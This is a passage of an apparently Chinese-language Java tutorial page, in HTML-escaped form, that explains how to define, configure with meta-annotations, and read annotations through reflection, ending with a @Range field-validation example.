keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Check</span><span class=\"token punctuation\">(</span>min<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> max<span class=\"token operator\">=</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> value<span class=\"token operator\">=</span><span class=\"token number\">55</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">;</span>\n\n    <span class=\"token annotation punctuation\">@Check</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token number\">99</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> p<span class=\"token punctuation\">;</span>\n\n    <span class=\"token annotation punctuation\">@Check</span><span class=\"token punctuation\">(</span><span class=\"token number\">99</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// @Check(value=99)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> x<span class=\"token punctuation\">;</span>\n\n    <span class=\"token annotation punctuation\">@Check</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>@Check</code>就是一个注解。第一个<code>@Check(min=0, max=100, value=55)</code>明确定义了三个参数，第二个<code>@Check(value=99)</code>只定义了一个<code>value</code>参数，它实际上和<code>@Check(99)</code>是完全一样的。最后一个<code>@Check</code>表示所有参数都使用默认值。</p>\n<h2>定义注解</h2>\n<p>Java语言使用<code>@interface</code>语法来定义注解（<code>Annotation</code>），它的格式如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注解的参数类似无参数方法，可以用<code>default</code>设定一个默认值（强烈推荐）。最常用的参数应当命名为<code>value</code>。</p>\n<h3>元注解</h3>\n<p>有一些注解可以修饰其他注解，这些注解就称为元注解（meta annotation）。Java标准库已经定义了一些元注解，我们只需要使用元注解，通常不需要自己去编写元注解。</p>\n<h4>@Target</h4>\n<p>最常用的元注解是<code>@Target</code>。使用<code>@Target</code>可以定义<code>Annotation</code>能够被应用于源码的哪些位置：</p>\n<ul>\n<li>类或接口：<code>ElementType.TYPE</code>；</li>\n<li>字段：<code>ElementType.FIELD</code>；</li>\n<li>方法：<code>ElementType.METHOD</code>；</li>\n<li>构造方法：<code>ElementType.CONSTRUCTOR</code>；</li>\n<li>方法参数：<code>ElementType.PARAMETER</code>。</li>\n</ul>\n<p>例如，定义注解<code>@Report</code>可用在方法上，我们必须添加一个<code>@Target(ElementType.METHOD)</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Target</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">METHOD</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>定义注解<code>@Report</code>可用在方法或字段上，可以把<code>@Target</code>注解参数变为数组<code>{ ElementType.METHOD, ElementType.FIELD }</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Target</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">METHOD</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">FIELD</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>实际上<code>@Target</code>定义的<code>value</code>是<code>ElementType[]</code>数组，只有一个元素时，可以省略数组的写法。</p>\n<h4>@Retention</h4>\n<p>另一个重要的元注解<code>@Retention</code>定义了<code>Annotation</code>的生命周期：</p>\n<ul>\n<li>仅编译期：<code>RetentionPolicy.SOURCE</code>；</li>\n<li>仅class文件：<code>RetentionPolicy.CLASS</code>；</li>\n<li>运行期：<code>RetentionPolicy.RUNTIME</code>。</li>\n</ul>\n<p>如果<code>@Retention</code>不存在，则该<code>Annotation</code>默认为<code>CLASS</code>。因为通常我们自定义的<code>Annotation</code>都是<code>RUNTIME</code>，所以，务必要加上<code>@Retention(RetentionPolicy.RUNTIME)</code>这个元注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Retention</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">RetentionPolicy</span><span class=\"token punctuation\">.</span><span class=\"token constant\">RUNTIME</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h4>@Repeatable</h4>\n<p>使用<code>@Repeatable</code>这个元注解可以定义<code>Annotation</code>是否可重复。这个注解应用不是特别广泛。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Repeatable</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Reports</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token annotation punctuation\">@Target</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">TYPE</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token annotation punctuation\">@Target</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">TYPE</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Reports</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Report</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>经过<code>@Repeatable</code>修饰后，在某个类型声明处，就可以添加多个<code>@Report</code>注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Report</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> level<span class=\"token operator\">=</span><span class=\"token string\">\"debug\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token annotation punctuation\">@Report</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> level<span class=\"token operator\">=</span><span class=\"token string\">\"warning\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h4>@Inherited</h4>\n<p>使用<code>@Inherited</code>定义子类是否可继承父类定义的<code>Annotation</code>。<code>@Inherited</code>仅针对<code>@Target(ElementType.TYPE)</code>类型的<code>annotation</code>有效，并且仅针对<code>class</code>的继承，对<code>interface</code>的继承无效：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Inherited</span>\n<span class=\"token annotation punctuation\">@Target</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">TYPE</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在使用的时候，如果一个类用到了<code>@Report</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Report</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>则它的子类默认也定义了该注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>如何定义Annotation</h3>\n<p>我们总结一下定义<code>Annotation</code>的步骤：</p>\n<p>第一步，用<code>@interface</code>定义注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>第二步，添加参数、默认值：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>把最常用的参数定义为<code>value()</code>，推荐所有参数都尽量设置默认值。</p>\n<p>第三步，用元注解配置注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Target</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">TYPE</span><span class=\"token punctuation\">)</span>\n<span class=\"token annotation punctuation\">@Retention</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">RetentionPolicy</span><span class=\"token punctuation\">.</span><span class=\"token constant\">RUNTIME</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Report</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"info\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">String</span> <span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>其中，必须设置<code>@Target</code>和<code>@Retention</code>，<code>@Retention</code>一般设置为<code>RUNTIME</code>，因为我们自定义的注解通常要求在运行期读取。一般情况下，不必写<code>@Inherited</code>和<code>@Repeatable</code>。</p>\n<h2>处理注解</h2>\n<p>Java的注解本身对代码逻辑没有任何影响。根据<code>@Retention</code>的配置：</p>\n<ul>\n<li><code>SOURCE</code>类型的注解在编译期就被丢掉了；</li>\n<li><code>CLASS</code>类型的注解仅保存在class文件中，它们不会被加载进JVM；</li>\n<li><code>RUNTIME</code>类型的注解会被加载进JVM，并且在运行期可以被程序读取。</li>\n</ul>\n<p>如何使用注解完全由工具决定。<code>SOURCE</code>类型的注解主要由编译器使用，因此我们一般只使用，不编写。<code>CLASS</code>类型的注解主要由底层工具库使用，涉及到class的加载，一般我们很少用到。只有<code>RUNTIME</code>类型的注解不但要使用，还经常需要编写。</p>\n<p>因此，我们只讨论如何读取<code>RUNTIME</code>类型的注解。</p>\n<p>因为注解定义后也是一种<code>class</code>，所有的注解都继承自<code>java.lang.annotation.Annotation</code>，因此，读取注解，需要使用反射API。</p>\n<p>Java提供的使用反射API读取<code>Annotation</code>的方法包括：</p>\n<p>判断某个注解是否存在于<code>Class</code>、<code>Field</code>、<code>Method</code>或<code>Constructor</code>：</p>\n<ul>\n<li>Class.isAnnotationPresent(Class)</li>\n<li>Field.isAnnotationPresent(Class)</li>\n<li>Method.isAnnotationPresent(Class)</li>\n<li>Constructor.isAnnotationPresent(Class)</li>\n</ul>\n<p>例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 判断@Report是否存在于Person类:</span>\n<span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">isAnnotationPresent</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Report</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>使用反射API读取Annotation：</p>\n<ul>\n<li>Class.getAnnotation(Class)</li>\n<li>Field.getAnnotation(Class)</li>\n<li>Method.getAnnotation(Class)</li>\n<li>Constructor.getAnnotation(Class)</li>\n</ul>\n<p>例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 获取Person定义的@Report注解:</span>\n<span class=\"token class-name\">Report</span> report <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Report</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> type <span class=\"token operator\">=</span> report<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">String</span> level <span class=\"token operator\">=</span> report<span class=\"token punctuation\">.</span><span class=\"token function\">level</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>使用反射API读取<code>Annotation</code>有两种方法。方法一是先判断<code>Annotation</code>是否存在，如果存在，就直接读取：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">.</span><span class=\"token function\">isAnnotationPresent</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Report</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Report</span> report <span class=\"token operator\">=</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Report</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>第二种方法是直接读取<code>Annotation</code>，如果<code>Annotation</code>不存在，将返回<code>null</code>：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Report</span> report <span class=\"token operator\">=</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Report</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>report <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>读取方法、字段和构造方法的<code>Annotation</code>和Class类似。但要读取方法参数的<code>Annotation</code>就比较麻烦一点，因为方法参数本身可以看成一个数组，而每个参数又可以定义多个注解，所以，一次获取方法参数的所有注解就必须用一个二维数组来表示。例如，对于以下方法定义的注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@NotNull</span> <span class=\"token annotation punctuation\">@Range</span><span class=\"token punctuation\">(</span>max<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token annotation punctuation\">@NotNull</span> <span class=\"token class-name\">String</span> prefix<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>要读取方法参数的注解，我们先用反射获取<code>Method</code>实例，然后读取方法参数的所有注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 获取Method实例:</span>\n<span class=\"token class-name\">Method</span> m <span class=\"token operator\">=</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token comment\">// 获取所有参数的Annotation:</span>\n<span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> annos <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span><span class=\"token function\">getParameterAnnotations</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 第一个参数（索引为0）的所有Annotation:</span>\n<span class=\"token class-name\">Annotation</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> annosOfName <span class=\"token operator\">=</span> annos<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Annotation</span> anno <span class=\"token operator\">:</span> annosOfName<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>anno <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Range</span> r<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// @Range注解</span>\n        r<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>anno <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">NotNull</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// @NotNull注解</span>\n        <span class=\"token comment\">//</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>使用注解</h3>\n<p>注解如何使用，完全由程序自己决定。例如，JUnit是一个测试框架，它会自动运行所有标记为<code>@Test</code>的方法。</p>\n<p>我们来看一个<code>@Range</code>注解，我们希望用它来定义一个<code>String</code>字段的规则：字段长度满足<code>@Range</code>的参数定义：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@Retention</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">RetentionPolicy</span><span class=\"token punctuation\">.</span><span class=\"token constant\">RUNTIME</span><span class=\"token punctuation\">)</span>\n<span class=\"token annotation punctuation\">@Target</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ElementType</span><span class=\"token punctuation\">.</span><span class=\"token constant\">FIELD</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token annotation punctuation\">@interface</span> <span class=\"token class-name\">Range</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> <span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">default</span> <span class=\"token number\">255</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>在某个JavaBean中，我们可以使用该注解：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Range</span><span class=\"token punctuation\">(</span>min<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> max<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n\n    <span class=\"token annotation punctuation\">@Range</span><span class=\"token punctuation\">(</span>max<span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> city<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>但是，定义了注解，本身对程序逻辑没有任何影响。我们必须自己编写代码来使用注解。这里，我们编写一个<code>Person</code>实例的检查方法，它可以检查<code>Person</code>实例的<code>String</code>字段长度是否满足<code>@Range</code>的定义：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Person</span> person<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ReflectiveOperationException</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 遍历所有Field:</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Field</span> field <span class=\"token operator\">:</span> person<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getFields</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 获取Field定义的@Range:</span>\n        <span class=\"token class-name\">Range</span> range <span class=\"token operator\">=</span> field<span class=\"token punctuation\">.</span><span class=\"token function\">getAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Range</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 如果@Range存在:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>range <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 获取Field的值:</span>\n            <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> field<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>person<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 如果值是String:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token 